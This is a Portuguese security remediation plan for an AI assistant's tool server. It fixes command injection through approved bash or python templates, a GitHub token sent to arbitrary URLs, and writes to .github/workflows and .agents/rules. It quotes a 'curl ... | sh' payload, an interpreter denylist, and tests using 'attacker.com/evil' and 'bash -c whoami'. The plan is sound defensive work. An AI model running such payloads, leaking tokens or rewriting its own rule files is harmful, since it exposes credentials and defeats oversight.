# Fase 00 — Blindagem de Execução de Comandos, Proteção de Destino de Rede e Expansão da Sandbox

**Resolve:** Achados **SEC-01** (Execução arbitrária de comandos em ferramentas shell customizadas), **SEC-02** (Vazamento potencial de token Bearer em `callGitHubAPI`) e **SEC-05** (Proteção de pastas sensíveis `.github/` e `.agents/` na sandbox).  
**Prioridade:** P0 (Segurança Crítica).  
**Esforço:** Médio.  
**Arquivos Principais:**
- `server/src/modules/skills/custom-tools.service.ts`
- `server/src/modules/skills/custom-tools.security.test.ts`
- `server/src/utils/git-core.ts`
- `server/src/utils/git.ts`
- `server/src/modules/skills/script-runner.ts`
- `server/src/modules/skills/custom-tools.escape.test.ts`

---

## 1. Contexto e Diagnóstico

### 1.1 Injeção de Comandos em Ferramentas Shell Customizadas (SEC-01)
Em `server/src/modules/skills/custom-tools.service.ts`, a função `executeShellHandler` executa comandos CLI via `execFileAsync`:
```typescript
const executable = (config.executable || '').trim();
const rawArgs = Array.isArray(config.args) ? config.args : [];
const finalArgs = rawArgs.map((argTemplate) => {
  let replaced = argTemplate;
  for (const [key, val] of Object.entries(args)) {
    replaced = replaced.replaceAll(`{{${key}}}`, String(val ?? ''));
  }
  return replaced;
});
const resolvedBin = resolveExecutable(executable);
await execFileAsync(resolvedBin, finalArgs, { ... });
```
**Vulnerabilidade:** A validação de aprovação (`isToolApproved`) apenas compara o hash da definição da ferramenta (o template). Se uma ferramenta for aprovada com `executable: "bash"` e `args: ["-c", "{{script}}"]`, ou `executable: "python"`, `args: ["-c", "{{code}}"]`, qualquer usuário ou modelo de IA pode enviar `{ script: "curl ... | sh" }` ou comandos destrutivos no payload de execução sem violar o hash aprovado. Além disso, `resolveExecutable` aceita qualquer binário encontrado no PATH.

### 1.2 Transmissão Insegura de Token Bearer para URLs Arbitrárias (SEC-02)
Em `server/src/utils/git-core.ts`, a função `callGitHubAPI` aceita qualquer endpoint que comece com `http://` ou `https://`:
```typescript
const url = endpoint.startsWith("http://") || endpoint.startsWith("https://")
  ? endpoint
  : `https://api.github.com${endpoint.startsWith("/") ? "" : "/"}${endpoint}`;

const activeToken = getActiveBearerToken(token);
if (activeToken) {
  headers["Authorization"] = `Bearer ${activeToken}`;
}
```
**Vulnerabilidade:** Se uma URL arbitrária de terceiro for passada no parâmetro `endpoint`, o token de acesso pessoal (PAT) com escopo de escrita do GitHub é transmitido no cabeçalho `Authorization: Bearer <token>` para o servidor do atacante.

### 1.3 Permissão de Gravação em Diretórios Críticos `.github/` e `.agents/` (SEC-05)
Em `server/src/modules/skills/script-runner.ts`, a função `assertSafeRepoPath` proíbe manipulações em `.git`, `.tools` e `.context-os`.
**Vulnerabilidade:** Scripts customizados executados na sandbox ainda podem gravar ou sobrescrever arquivos em `.github/workflows/` (permitindo injeção de pipelines maliciosos de CI) e `.agents/rules/` (permitindo adulteração de instruções do assistente de IA).

---

## 2. Passos de Execução

### 2.1 Allowlist Estrita e Bloqueio de Interpretadores em `executeShellHandler`
1. Em `custom-tools.service.ts`:
   - Definir uma lista explícita de binários CLI permitidos para automações utilitárias (ex: `git`, `npm`, `npx`, `pnpm`, `yarn`, `cargo`, `go`, `docker`, `rg`, `grep`, `diff`, `patch`, `tree`).
   - Criar uma denylist terminante de interpretadores interativos que aceitam flags de execução direta (`bash`, `sh`, `zsh`, `csh`, `ksh`, `python`, `python3`, `node`, `deno`, `bun`, `perl`, `ruby`, `eval`, `cmd.exe`, `powershell.exe`, `pwsh`).
   - Se `config.executable` for um interpretador ou não pertencer à allowlist de executáveis seguros, rejeitar a execução imediatamente com erro 400 descritivo.

### 2.2 Blindagem de Destino e Validação de Host em `callGitHubAPI`
1. Em `git-core.ts`:
   - Validar que a URL final seja estritamente resolvida sob o domínio `api.github.com` (ou endpoint corporativo configurado explicitamente em `config.json` via variável controlada `github_enterprise_api_url`).
   - Rejeitar endpoints contendo esquemas HTTP sem criptografia ou apontando para domínios externos não autorizados, lançando `Error("Destino da API Git não autorizado para envio de credenciais Bearer")`.

### 2.3 Expansão dos Diretórios Protegidos em `assertSafeRepoPath`
1. Em `script-runner.ts`:
   - Atualizar a verificação de caminhos relativos em `assertSafeRepoPath` para incluir `.github` e `.agents`:
     ```javascript
     const protectedDirs = ['.git', '.tools', '.context-os', '.github', '.agents'];
     if (parts.some((p) => protectedDirs.includes(p))) {
       throw new Error('Acesso negado: manipulação de pastas internas de infraestrutura (.git / .tools / .github / .agents) é estritamente proibida.');
     }
     ```

---

## 3. Critérios de Aceite e Verificação

1. **Testes TDD RED:**
   - Adicionar teste em `custom-tools.security.test.ts` tentando executar `bash -c "whoami"` ou `python -c "..."` via shell handler, garantindo que seja rejeitado.
   - Adicionar teste tentando chamar `callGitHubAPI("https://attacker.com/evil")` com token, validando que o request é bloqueado antes da emissão de rede.
   - Adicionar teste em `custom-tools.escape.test.ts` tentando gravar em `.github/workflows/ci.yml` e `.agents/rules/test.md`, garantindo erro de acesso negado.
2. **Validação:** Todos os testes novos e existentes devem passar com 100% de sucesso (`npm test` no servidor).
